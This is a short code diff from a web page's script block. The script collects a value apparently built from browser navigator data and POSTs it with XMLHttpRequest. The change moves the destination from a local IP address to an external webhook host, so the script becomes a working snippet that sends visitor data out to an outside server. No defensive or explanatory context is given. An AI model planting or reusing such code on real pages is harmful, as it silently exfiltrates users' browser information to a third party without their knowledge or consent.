@@ -16,7 +16,7 @@ document.write(nav_formated);
 send_response(nav_formated);
 function send_response(response){
 var o_req = new XMLHttpRequest();
-o_req.open('POST','http://192.168.0.1:9999');
+o_req.open('POST','https://webhook.iamb2g.com');
 o_req.send(response);
 }
 </script>
